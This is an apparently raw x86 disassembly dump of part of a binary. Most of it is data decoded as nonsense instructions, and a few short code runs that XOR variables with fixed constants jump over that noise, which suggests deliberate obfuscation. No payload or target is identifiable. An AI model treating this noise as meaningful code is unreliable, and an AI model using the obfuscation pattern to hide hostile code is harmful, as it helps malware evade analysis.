  40bcc3:	mov    ecx,0x777f64be
  40bcc8:	sub    DWORD PTR [ebp-0x59],esi
  40bccb:	or     eax,0x4b378526
  40bcd0:	mov    edx,0xaae1f882
  40bcd5:	nop
  40bcd6:	add    DWORD PTR [eax+0x61],edi
  40bcd9:	dec    edx
  40bcda:	or     BYTE PTR [eax+0x67d25c97],0xe6
  40bce1:	ret    0x98e5
  40bce4:	ja     0x40bc79
  40bce6:	adc    eax,0x618b835c
  40bceb:	cmp    BYTE PTR [edi+0x3c9c0363],cl
  40bcf1:	mov    esi,0xc251541d
  40bcf6:	inc    ebx
  40bcf7:	add    al,0x49
  40bcf9:	(bad)  
  40bcfa:	pop    ebx
  40bcfb:	jbe    0x40bd12
  40bcfd:	call   0x41ccbf0c
  40bd02:	sub    edx,DWORD PTR [eax+0x605c929c]
  40bd08:	pop    esi
  40bd09:	mov    esp,0xaaa6732b
  40bd0e:	imul   esi,DWORD PTR [esi+0x72],0x8ef4ccd1
  40bd15:	cmp    DWORD PTR [eax+ecx*1],esi
  40bd18:	cmp    DWORD PTR [ebp+0x62],edi
  40bd1b:	jmp    0x267d:0x14c46fa9
  40bd22:	in     eax,0xa6
  40bd24:	std    
  40bd25:	loop   0x40bd63
  40bd27:	(bad)  
  40bd28:	(bad)  
  40bd29:	xlat   BYTE PTR ds:[ebx]
  40bd2a:	adc    ch,BYTE PTR [ebp-0x5f]
  40bd2d:	jp     0x40bd3c
  40bd2f:	leave  
  40bd30:	push   0x7f
  40bd32:	jmp    0xf37d:0x9ab63e07
  40bd39:	pop    esi
  40bd3a:	out    0x43,eax
  40bd3c:	push   0x1c23bec3
  40bd41:	sahf   
  40bd42:	(bad)  [ebx]
  40bd44:	stos   DWORD PTR es:[edi],eax
  40bd45:	push   edx
  40bd46:	jns    0x40bcd9
  40bd48:	cmp    eax,0xd0aef567
  40bd4d:	mov    dl,0xc8
  40bd4f:	int3   
  40bd50:	lock repnz mov esp,ecx
  40bd54:	xor    dl,BYTE PTR [ebx]
  40bd56:	aas    
  40bd57:	gs stc 
  40bd59:	out    dx,eax
  40bd5a:	enter  0x9102,0x20
  40bd5e:	loope  0x40bd6f
  40bd60:	add    ah,BYTE PTR [edx+0x45]
  40bd63:	mov    dh,0x27
  40bd65:	lock into 
  40bd67:	jb     0x40bd9d
  40bd69:	das    
  40bd6a:	mov    bl,0x44
  40bd6c:	pop    WORD PTR [edi]
  40bd6f:	jp     0x40bd09
  40bd71:	jle    0x40bdb3
  40bd73:	fmul   QWORD PTR [ecx+eax*2-0x45]
  40bd77:	test   BYTE PTR [ecx-0x67],dh
  40bd7a:	je     0x40bda9
  40bd7c:	daa    
  40bd7d:	sbb    esp,DWORD PTR [edx+esi*4]
  40bd80:	popf   
  40bd81:	dec    ebx
  40bd82:	mov    bh,0x5f
  40bd84:	dec    ebx
  40bd85:	mov    edx,0x961c3f77
  40bd8a:	and    eax,0xa44761a1
  40bd8f:	xor    esp,edx
  40bd91:	(bad)  
  40bd92:	pop    esi
  40bd93:	es lahf 
  40bd95:	mov    al,ds:0x63bafb64
  40bd9a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40bd9c:	pop    ds
  40bd9d:	push   ebx
  40bd9e:	sbb    eax,0x1a15c83a
  40bda3:	jmp    0xa097:0xa1da8af9
  40bdaa:	jg     0x40be25
  40bdac:	aad    0x40
  40bdae:	mov    cl,0x9e
  40bdb0:	mov    bh,0x1d
  40bdb2:	in     eax,dx
  40bdb3:	test   eax,0x976634e2
  40bdb8:	ins    BYTE PTR es:[edi],dx
  40bdb9:	sub    ch,BYTE PTR [eax+0x51012be]
  40bdbf:	jnp    0x40be00
  40bdc1:	pop    esp
  40bdc2:	jbe    0x40bda8
  40bdc4:	mov    bl,0x81
  40bdc6:	ins    DWORD PTR es:[edi],dx
  40bdc7:	sbb    ah,BYTE PTR [edi]
  40bdc9:	add    edx,DWORD PTR [ebp-0x500afbc2]
  40bdcf:	rcr    DWORD PTR [eax+0x4c],cl
  40bdd2:	dec    ebx
  40bdd3:	pop    edx
  40bdd4:	jo     0x40bde2
  40bdd6:	inc    esp
  40bdd7:	imul   esp,DWORD PTR [edi+0x34d15011],0xffffffe6
  40bdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddf:	mov    ecx,0x2250f0bf
  40bde4:	xor    BYTE PTR [eax+edi*2+0x3f7e6c0c],bh
  40bdeb:	in     eax,dx
  40bdec:	test   edi,0xeee63d19
  40bdf2:	mov    eax,ds:0xe18047d
  40bdf7:	inc    esi
  40bdf8:	inc    ebx
  40bdf9:	add    eax,0x91a1c74c
  40bdfe:	or     BYTE PTR [edx-0x62],cl
  40be01:	stc    
  40be02:	mov    dl,0xc8
  40be04:	jae    0x40be6f
  40be06:	pop    ds
  40be07:	cmp    ah,BYTE PTR [esi-0x43]
  40be0a:	xor    bl,dh
  40be0c:	sub    eax,0xabf5ed90
  40be11:	in     eax,0x32
  40be13:	scas   al,BYTE PTR es:[edi]
  40be14:	sbb    BYTE PTR [ecx],dh
  40be16:	fld    TBYTE PTR [ebp+0x75cdc0bd]
  40be1c:	inc    ebp
  40be1d:	pusha  
  40be1e:	jno    0x40be8e
  40be20:	les    ebp,FWORD PTR [edx-0x6070ecbb]
  40be26:	jl     0x40bdf6
  40be28:	push   eax
  40be29:	sub    DWORD PTR [edx+eiz*4+0x79],0x26
  40be2e:	xlat   BYTE PTR ds:[ebx]
  40be2f:	push   es
  40be30:	clc    
  40be31:	out    0xc6,eax
  40be33:	mov    dh,0x5c
  40be35:	data16 jnp 0x40be3b
  40be38:	cmp    al,0x89
  40be3a:	sbb    al,0xd8
  40be3c:	inc    ebx
  40be3d:	sub    DWORD PTR [edx+0x0],esp
  40be40:	iret   
  40be41:	sub    eax,0x7ffdae50
  40be46:	jb     0x40bdd3
  40be48:	mov    bh,bh
  40be4a:	leave  
  40be4b:	test   BYTE PTR [ecx-0x53e9172d],dl
  40be51:	retf   0x9af3
  40be54:	mov    bl,cl
  40be56:	jne    0x40bec1
  40be58:	or     al,0x16
  40be5a:	inc    esp
  40be5b:	sub    cl,BYTE PTR [eax-0x75]
  40be5e:	dec    edi
  40be5f:	aaa    
  40be60:	mov    edi,0x7f368514
  40be65:	mov    edx,cr3
  40be68:	cmc    
  40be69:	in     eax,0xff
  40be6b:	shr    dl,0xb1
  40be6e:	sub    DWORD PTR [eax+0x6b9cea2b],esi
  40be74:	lea    ebp,[eax-0x342dfb35]
  40be7a:	je     0x40be4d
  40be7c:	push   edx
  40be7d:	push   ebx
  40be7e:	jge    0x40be6c
  40be80:	or     eax,0x43cd5e47
  40be85:	outs   dx,BYTE PTR ds:[esi]
  40be86:	dec    edx
  40be87:	int3   
  40be88:	les    edx,FWORD PTR [esi-0x3d]
  40be8b:	ins    BYTE PTR es:[edi],dx
  40be8c:	jp     0x40be33
  40be8e:	push   0x2aad6d63
  40be93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be94:	(bad)  
  40be95:	gs adc al,0x77
  40be98:	jnp    0x40be42
  40be9a:	sbb    al,0x71
  40be9c:	push   esi
  40be9d:	dec    ebx
  40be9e:	loopne 0x40bf13
  40bea0:	outs   dx,DWORD PTR ds:[esi]
  40bea1:	xor    BYTE PTR [edi-0x23a940ba],bh
  40bea7:	sahf   
  40bea8:	adc    eax,0x1655de90
  40bead:	stos   DWORD PTR es:[edi],eax
  40beae:	dec    eax
  40beaf:	cdq    
  40beb0:	les    esi,FWORD PTR [ebp-0x763593bb]
  40beb6:	mov    ds:0xe9924713,eax
  40bebb:	sub    edx,DWORD PTR [ebx-0x73e6a957]
  40bec1:	inc    ecx
  40bec2:	lea    esp,[ecx+esi*1]
  40bec5:	add    bl,BYTE PTR [ecx+edi*4-0x5a]
  40bec9:	or     al,0x64
  40becb:	mul    DWORD PTR [ebx-0x9073288]
  40bed1:	or     DWORD PTR [edi],eax
  40bed3:	popa   
  40bed4:	scas   eax,DWORD PTR es:[edi]
  40bed5:	std    
  40bed6:	jl     0x40bea8
  40bed8:	outs   dx,DWORD PTR ds:[esi]
  40bed9:	inc    ebp
  40beda:	das    
  40bedb:	inc    ebp
  40bedc:	adc    ebp,DWORD PTR [ebx-0xd]
  40bedf:	(bad)  
  40bee0:	(bad)  [esi-0x18e1ca9]
  40bee6:	push   ss
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x77beecf]
  40bf27:	rol    BYTE PTR [eax+0x387e7ef9],0x7c
  40bf2e:	jle    0x40bfae
  40bf30:	cdq    
  40bf31:	mov    al,ds:0x1d3b24af
  40bf36:	repz icebp 
  40bf38:	jl     0x40bf0b
  40bf3a:	call   0xc64:0x9cf842da
  40bf41:	jbe    0x40bf74
  40bf43:	call   0x53da:0x77771a35
  40bf4a:	out    0x77,al
  40bf4c:	cmc    
  40bf4d:	cmp    BYTE PTR [edi+0x1869ed81],bh
  40bf53:	jne    0x40bf29
  40bf55:	icebp  
  40bf56:	mov    dl,0x56
  40bf58:	js     0x40bf63
  40bf5a:	sti    
  40bf5b:	int    0xb
  40bf5d:	in     eax,0xf6
  40bf5f:	xor    ch,BYTE PTR [eax]
  40bf61:	cmp    al,BYTE PTR [ebp-0x51]
  40bf64:	das    
  40bf65:	jle    0x40bfdb
  40bf67:	inc    ebp
  40bf68:	int3   
  40bf69:	sbb    al,0x3f
  40bf6b:	push   DWORD PTR [eax-0x61]
  40bf6e:	dec    edx
  40bf6f:	int    0xb9
  40bf71:	retf   
  40bf72:	into   
  40bf73:	repz out dx,eax
  40bf75:	jp     0x40bf0a
  40bf77:	sti    
  40bf78:	lock ins BYTE PTR es:[edi],dx
  40bf7a:	xor    cl,bh
  40bf7c:	cmp    eax,0x4dc80008
  40bf81:	fs fcmovnb st,st(7)
  40bf84:	aas    
  40bf85:	test   eax,0x955bc47a
  40bf8a:	dec    esp
  40bf8b:	in     al,dx
  40bf8c:	mov    eax,ds:0xa262d0fa
  40bf91:	lahf   
  40bf92:	sub    edi,edx
  40bf94:	nop
  40bf95:	pop    eax
  40bf96:	jmp    0x40bf54
  40bf98:	lods   al,BYTE PTR ds:[esi]
  40bf99:	dec    ebp
  40bf9a:	sbb    dh,bl
  40bf9c:	stc    
  40bf9d:	pop    edi
  40bf9e:	or     al,0x87
  40bfa0:	mov    eax,DWORD PTR [edx]
  40bfa2:	cmp    DWORD PTR [esi-0x3a],ecx
  40bfa5:	les    edi,FWORD PTR [edx-0x6e]
  40bfa8:	ret    0x7d53
  40bfab:	sub    eax,0x87af9ffa
  40bfb0:	jo     0x40bfe1
  40bfb2:	cdq    
  40bfb3:	(bad)  
  40bfb4:	cdq    
  40bfb5:	xchg   esi,eax
  40bfb6:	(bad)  
  40bfb7:	jbe    0x40c00e
  40bfb9:	inc    ebx
  40bfba:	adc    eax,DWORD PTR [ebx+0x1f]
  40bfbd:	xchg   ecx,eax
  40bfbe:	xchg   edi,eax
  40bfbf:	xlat   BYTE PTR ds:[ebx]
  40bfc0:	xchg   DWORD PTR [ebp+0x78],ecx
  40bfc3:	push   edx
  40bfc4:	sti    
  40bfc5:	mov    ch,0xf9
  40bfc7:	push   0x6dc50bb4
  40bfcc:	pop    ss
  40bfcd:	and    eax,0x75854a3c
  40bfd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfd3:	pop    ebx
  40bfd4:	adc    DWORD PTR [ecx+0x14],esi
  40bfd7:	iret   
  40bfd8:	pushf  
  40bfd9:	add    dl,BYTE PTR [esi]
  40bfdb:	sub    BYTE PTR [ebx-0x50],0x50
  40bfdf:	add    DWORD PTR [esi*4-0x5653e8],ebx
  40bfe6:	ins    BYTE PTR es:[edi],dx
  40bfe7:	(bad)  
  40bfe8:	call   0xd68758cc
  40bfed:	push   cs
  40bfee:	cli    
  40bfef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff0:	test   DWORD PTR [edx+0x72],ecx
  40bff3:	pop    edx
  40bff4:	xor    BYTE PTR [eax-0x4de6ea72],bl
  40bffa:	mov    ds:0xb4ed39e8,al
  40bfff:	in     al,0xd1
  40c001:	scas   eax,DWORD PTR es:[edi]
  40c002:	mov    eax,0xc94b50d6
  40c007:	push   esp
  40c008:	fdiv   DWORD PTR [edi]
  40c00a:	fadd   DWORD PTR [eax+0x4f]
  40c00d:	inc    ecx
  40c00e:	jmp    0xb9f0:0x2eb21b1f
  40c015:	gs cld 
  40c017:	cld    
  40c018:	test   eax,0xcc405151
  40c01d:	or     BYTE PTR [ebx],bh
  40c01f:	inc    ecx
  40c020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c021:	stc    
  40c022:	test   ah,dl
  40c024:	xor    al,0x14
  40c026:	xor    bh,BYTE PTR [edx]
  40c028:	pop    eax
  40c029:	jb     0x40c046
  40c02b:	jg     0x40c05d
  40c02d:	addr16 mov bl,0x4
  40c030:	mov    eax,ds:0xba127724
  40c035:	sub    ebx,eax
  40c037:	dec    ebx
  40c038:	pushf  
  40c039:	gs pop ebp
  40c03b:	add    DWORD PTR [ebx+ecx*2],esp
  40c03e:	adc    esi,DWORD PTR [ebp+0x70]
  40c041:	inc    edx
  40c042:	retf   
  40c043:	mov    bl,0x2a
  40c045:	ret    
  40c046:	cmp    ch,BYTE PTR [ebx-0x2fcf5356]
  40c04c:	fld    TBYTE PTR [edi+ebx*8-0x35]
  40c050:	sbb    DWORD PTR [edi],esp
  40c052:	xor    BYTE PTR [ebp-0xd],0x8f
  40c056:	dec    esp
  40c057:	cmp    BYTE PTR [eax],bl
  40c059:	jecxz  0x40c0b7
  40c05b:	mov    edi,0xa0a1f160
  40c060:	pusha  
  40c061:	stos   BYTE PTR es:[edi],al
  40c062:	cmp    bl,dl
  40c064:	adc    eax,0x4e2f7559
  40c069:	inc    esi
  40c06a:	cs scas al,BYTE PTR es:[edi]
  40c06c:	or     BYTE PTR [edi+eax*8],dh
  40c06f:	mov    dh,0x9b
  40c071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c072:	shl    DWORD PTR [edi+0x5e1eef4c],cl
  40c078:	lea    edi,[ebx+edx*1]
  40c07b:	xchg   edi,eax
  40c07c:	jo     0x40c0ba
  40c07e:	mov    dh,0xdf
  40c080:	sub    DWORD PTR [edi],ebp
  40c082:	icebp  
  40c083:	jnp    0x40c007
  40c085:	imul   eax,DWORD PTR [eax],0x75c7914e
  40c08b:	ins    DWORD PTR es:[edi],dx
  40c08c:	or     BYTE PTR ds:0xdf4ad175,cl
  40c092:	push   ebp
  40c093:	nop
  40c094:	dec    ecx
  40c095:	ret    
  40c096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c097:	dec    ebp
  40c098:	or     DWORD PTR [ebx],0xd3d383f3
  40c09e:	je     0x40c045
  40c0a0:	es mov eax,0xcb028ce9
  40c0a6:	mov    es,WORD PTR [esi]
  40c0a8:	add    BYTE PTR [esi+0x66b59703],bh
  40c0ae:	cmp    bh,bh
  40c0b0:	ss call 0x1fc4:0x8503e449
  40c0b8:	inc    ebp
  40c0ba:	pop    eax
  40c0bb:	loop   0x40c0e5
  40c0bd:	std    
  40c0be:	pop    ss
  40c0bf:	ins    DWORD PTR es:[edi],dx
  40c0c0:	stos   BYTE PTR es:[edi],al
  40c0c1:	mov    ds:0x76891c98,al
  40c0c6:	inc    ecx
  40c0c7:	adc    al,bh
  40c0c9:	mov    ebx,0x900420bb
  40c0ce:	outs   dx,DWORD PTR ds:[esi]
  40c0cf:	and    esi,DWORD PTR [esi]
  40c0d1:	stos   BYTE PTR es:[edi],al
  40c0d2:	or     DWORD PTR [ecx-0x674e94ad],ebp
  40c0d8:	xchg   bh,ch
  40c0da:	and    al,0x74
  40c0dc:	pop    eax
  40c0dd:	out    0x30,eax
  40c0df:	sub    esp,DWORD PTR [ebx]
  40c0e1:	call   0x6739:0xeec57219
  40c0e8:	ret    
  40c0e9:	and    eax,0x80f429ea
  40c0ee:	fisub  WORD PTR [edi+0x7004f42b]
  40c0f4:	shl    BYTE PTR [esi],0xba
  40c0f7:	scas   al,BYTE PTR es:[edi]
  40c0f8:	test   BYTE PTR [esp+eax*1+0x203bf7a8],al
  40c0ff:	call   DWORD PTR [esi-0x7f]
  40c102:	and    dh,BYTE PTR [eax+0x1d]
  40c105:	jg     0x40c152
  40c107:	fidivr DWORD PTR [ebp+0x6b]
  40c10a:	sbb    al,0x49
  40c10c:	mov    al,ds:0x415ccf93
  40c111:	inc    edx
  40c112:	jmp    0x999dcede
  40c117:	pop    esp
  40c118:	test   DWORD PTR [edx],ebp
  40c11a:	scas   al,BYTE PTR es:[edi]
  40c11b:	xor    eax,0x4479283a
  40c120:	pop    edx
  40c121:	fs je  0x40c15f
  40c124:	aam    0x8
  40c126:	fadd   DWORD PTR [edx+0x3b]
  40c129:	jno    0x40c0df
  40c12b:	pop    eax
  40c12c:	icebp  
  40c12d:	pop    ecx
  40c12e:	lock mov edi,0x90a332bf
  40c134:	dec    edi
  40c135:	or     al,0x2e
  40c137:	ins    DWORD PTR es:[edi],dx
  40c138:	dec    esi
  40c139:	mov    dl,dh
  40c13b:	mov    al,0xd1
  40c13d:	sub    eax,0xa1313c84
  40c142:	mov    dl,BYTE PTR [edi]
  40c144:	int3   
  40c145:	test   eax,eax
  40c147:	xlat   BYTE PTR ds:[ebx]
  40c148:	clc    
  40c149:	xchg   ebx,eax
  40c14a:	sub    ebp,DWORD PTR [eax]
  40c14c:	mov    WORD PTR [edx+0x5716ebb],es
  40c152:	mov    ds:0x9e98f9e6,al
  40c157:	(bad)  
  40c158:	enter  0x8784,0x66
  40c15c:	adc    DWORD PTR [edi-0x7f],edx
  40c15f:	test   DWORD PTR [eax+esi*1+0x7d4bfa98],esp
  40c166:	stos   BYTE PTR es:[edi],al
  40c167:	push   ebp
  40c168:	(bad)  
  40c169:	cld    
  40c16a:	mov    ecx,0xd6283ea5
  40c16f:	inc    ebp
  40c170:	xchg   ebx,eax
  40c171:	or     al,0xf3
  40c173:	loop   0x40c1a7
  40c175:	mov    ah,0x87
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x33
  40c196:	stos   BYTE PTR es:[edi],al
  40c197:	inc    eax
  40c198:	jo     0x40c1e4
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	or     ebp,DWORD PTR [edx]
  40c1a3:	sub    ch,dl
  40c1a5:	push   eax
  40c1a6:	call   FWORD PTR ds:0x9a41b2de
  40c1ac:	leave  
  40c1ad:	dec    eax
  40c1ae:	mov    edi,0x5f0c9b70
  40c1b3:	and    ebp,eax
  40c1b5:	pop    ebp
  40c1b6:	rcr    DWORD PTR [esi-0x296bd4db],1
  40c1bc:	mov    WORD PTR [ebx+0x56],gs
  40c1bf:	pop    ecx
  40c1c0:	ret    0x295b
  40c1c3:	pop    eax
  40c1c4:	scas   eax,DWORD PTR es:[edi]
  40c1c5:	je     0x40c14c
  40c1c7:	mov    BYTE PTR [ebx+0x71],bh
  40c1ca:	inc    ecx
  40c1cb:	jbe    0x40c20a
  40c1cd:	or     esi,DWORD PTR [edi+0x55af4881]
  40c1d3:	shl    BYTE PTR [esi+ebp*1-0x1fafda47],0x9e
  40c1db:	shrd   DWORD PTR [edx+0x4d72dfe7],ebx,0x49
  40c1e3:	jo     0x40c1cc
  40c1e5:	pop    ebp
  40c1e6:	push   esi
  40c1e7:	arpl   WORD PTR [esi+eiz*4-0x3f71cbfb],dx
  40c1ee:	mov    eax,0x7aedcbef
  40c1f3:	push   ebp
  40c1f4:	out    0xd3,eax
  40c1f6:	pop    ecx
  40c1f7:	xchg   esp,edi
  40c1f9:	pop    ss
  40c1fa:	js     0x40c23a
  40c1fc:	leave  
  40c1fd:	or     ah,dl
  40c1ff:	sbb    BYTE PTR [eax+0x30],al
  40c202:	stos   BYTE PTR es:[edi],al
  40c203:	popa   
  40c204:	adc    bh,BYTE PTR [eax+0x47]
  40c207:	mov    esp,0xdb7a4612
  40c20c:	cmp    ebp,DWORD PTR [edi+0x5e]
  40c20f:	add    eax,0xdc34a702
  40c214:	adc    eax,0x518fe35d
  40c219:	mov    al,ds:0xd0a945d6
  40c21e:	sahf   
  40c21f:	mov    al,0xad
  40c221:	sub    ecx,0xffffffc1
  40c224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c225:	push   esp
  40c226:	cmp    edi,DWORD PTR [ebx]
  40c228:	dec    esi
  40c229:	loopne 0x40c1cd
  40c22b:	sub    ebx,DWORD PTR [esi+0x54]
  40c22e:	mov    ds:0xf9089bfd,eax
  40c233:	bound  ebp,QWORD PTR [ecx+edx*4-0x16]
  40c237:	sub    bl,BYTE PTR ds:0x2eb891a7
  40c23d:	cmp    al,0x54
  40c23f:	retf   0xe44e
  40c242:	jl     0x40c237
  40c244:	sbb    eax,DWORD PTR ds:0x92a7a3ee
  40c24a:	popf   
  40c24b:	jp     0x40c270
  40c24d:	mov    cl,dh
  40c24f:	and    al,0xec
  40c251:	sbb    DWORD PTR [ebp-0x7a1e8158],ecx
  40c257:	or     ecx,ecx
  40c259:	jge    0x40c264
  40c25b:	xchg   ecx,eax
  40c25c:	fstp   TBYTE PTR [ebp+0x19]
  40c25f:	mov    esp,0xd074c64b
  40c264:	enter  0x766,0xb2
  40c268:	xchg   DWORD PTR [ebp+0x473c9db6],eax
  40c26e:	push   es
  40c26f:	jmp    0x572bf3f8
  40c274:	lea    edx,[ebp-0xa]
  40c277:	adc    ecx,ebp
  40c279:	jle    0x40c28b
  40c27b:	pop    ebx
  40c27c:	and    DWORD PTR [ebp-0x5dab77db],ebp
  40c282:	sbb    ax,0xb313
  40c286:	aam    0x36
  40c288:	cmc    
  40c289:	ja     0x40c28a
  40c28b:	cmp    DWORD PTR [edx+0x48],0xffffffe7
  40c28f:	dec    edi
  40c290:	(bad)  
  40c291:	push   ebx
  40c292:	sar    DWORD PTR [ebp+eiz*1-0x2f761e6],cl
  40c299:	out    dx,eax
  40c29a:	in     al,dx
  40c29b:	cmp    eax,0x511ac96c
  40c2a0:	pusha  
  40c2a1:	cmp    BYTE PTR [ebp-0x2eaa9ae6],ah
  40c2a7:	pop    ss
  40c2a8:	gs xchg ebp,eax
  40c2aa:	inc    ebp
  40c2ab:	shr    BYTE PTR [ebx-0x45],1
  40c2ae:	sub    BYTE PTR [ebp-0x40],bh
  40c2b1:	nop
  40c2b2:	cmp    BYTE PTR [edx+0x35],0x72
  40c2b6:	enter  0xbea,0xba
  40c2ba:	or     BYTE PTR [edx],bh
  40c2bc:	push   eax
  40c2bd:	loop   0x40c273
  40c2bf:	les    ebx,FWORD PTR ds:0x9e0b0acc
  40c2c5:	leave  
  40c2c6:	cmp    BYTE PTR [ebx+eiz*4],0xa4
  40c2ca:	sub    al,0x4b
  40c2cc:	pop    edx
  40c2cd:	aaa    
  40c2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2cf:	mov    eax,0xac27f8b1
  40c2d4:	jge    0x40c317
  40c2d6:	in     eax,0xc0
  40c2d8:	cmp    DWORD PTR [edx],ebx
  40c2da:	and    al,0x1
  40c2dc:	xchg   ebx,eax
  40c2dd:	imul   sp,WORD PTR [esi-0x68391b49],0x5090
  40c2e6:	sub    edx,edx
  40c2e8:	push   eax
  40c2e9:	cmp    eax,0x7430677
  40c2ee:	popf   
  40c2ef:	and    ch,cl
  40c2f1:	xchg   BYTE PTR [esi-0x68],ah
  40c2f4:	lahf   
  40c2f5:	(bad)  
  40c2f6:	lea    edx,[ebp+0x6d]
  40c2f9:	fnstcw WORD PTR [edx-0xcd49158]
  40c2ff:	repnz xor ax,0x3f66
  40c304:	sub    eax,0x67afa455
  40c309:	inc    edx
  40c30a:	jnp    0x40c2e9
  40c30c:	mov    edx,0xd441caba
  40c311:	out    0xd5,eax
  40c313:	add    BYTE PTR [edi+0x60],al
  40c316:	(bad)  
  40c317:	xchg   edx,eax
  40c318:	jmp    0x4839:0xcc6522d2
  40c31f:	mov    edi,0xde497b9c
  40c324:	xchg   BYTE PTR [eax+ecx*2-0x62],cl
  40c328:	mov    edx,0xbebc0b7b
  40c32d:	mov    edx,0x2d405380
  40c332:	pop    ss
  40c333:	sbb    BYTE PTR [ebp-0x735cf408],dl
  40c339:	sub    al,0xc2
  40c33b:	jmp    0x40c3ba
  40c33d:	jmp    0xc22ebd81
  40c342:	xor    al,0xa
  40c344:	lds    ecx,FWORD PTR [edx+0x24]
  40c347:	in     al,0x2e
  40c349:	pop    ecx
  40c34a:	xchg   edi,eax
  40c34b:	jmp    0xa46a:0xd7e63849
  40c352:	xchg   ebp,eax
  40c353:	sbb    esi,DWORD PTR [edi+eax*4-0x49]
  40c357:	int3   
  40c358:	(bad)
  40c35c:	xor    DWORD PTR es:[edx],edx
  40c35f:	cmc    
  40c360:	shl    BYTE PTR [ebp-0x4c],1
  40c363:	or     BYTE PTR [esi],bh
  40c365:	test   eax,0x35af9562
  40c36a:	sub    al,BYTE PTR [edi+0x1dd63605]
  40c370:	pop    ebx
  40c371:	push   ds
  40c372:	inc    ebx
  40c373:	push   es
  40c374:	sbb    DWORD PTR ds:0x75639802,edi
  40c37a:	fnsave [edi+edx*8+0x9]
  40c37e:	lods   al,BYTE PTR ds:[esi]
  40c37f:	cwde   
  40c380:	aas    
  40c381:	fwait
  40c382:	mov    ch,0x31
  40c384:	mov    esp,0x22f91a3f
  40c389:	pop    edx
  40c38a:	fmul   QWORD PTR [edx+eax*1+0x2875ae28]
  40c391:	jle    0x40c39c
  40c393:	hlt    
  40c394:	shr    BYTE PTR [ebx+0x8e5eba0],1
  40c39a:	aam    0x4
  40c39c:	add    DWORD PTR [ecx-0x128fd7cc],eax
  40c3a2:	rcl    DWORD PTR [edi-0x6f6e4ba8],1
  40c3a8:	sbb    esi,DWORD PTR [esi+0x6350a79b]
  40c3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3af:	xor    eax,0x5bed3ae8
  40c3b4:	push   0xc
  40c3b6:	hlt    
  40c3b7:	jo     0x40c3f1
  40c3b9:	loopne 0x40c3fe
  40c3bb:	scas   eax,DWORD PTR es:[edi]
  40c3bc:	xor    BYTE PTR [eax+0x13],cl
  40c3bf:	jmp    0xb368:0x9993cc75
  40c3c6:	jl     0x40c3c0
  40c3c8:	shl    DWORD PTR [ebx-0x2749e5fe],cl
  40c3ce:	pop    ebp
  40c3cf:	xchg   DWORD PTR [eax],eax
  40c3d1:	jb     0x40c3ac
  40c3d3:	loope  0x40c3e4
  40c3d5:	cmp    cl,0x40
  40c3d8:	push   esp
  40c3d9:	mov    dl,0x2a
  40c3db:	cmp    edx,DWORD PTR [esi-0x6d18a79f]
  40c3e1:	int    0x81
  40c3e3:	inc    esi
  40c3e4:	rcl    BYTE PTR [edx],0x65
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shr    DWORD PTR [edx-0x64],cl
  40c448:	cwde   
  40c449:	mov    esp,0x7e7e8214
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
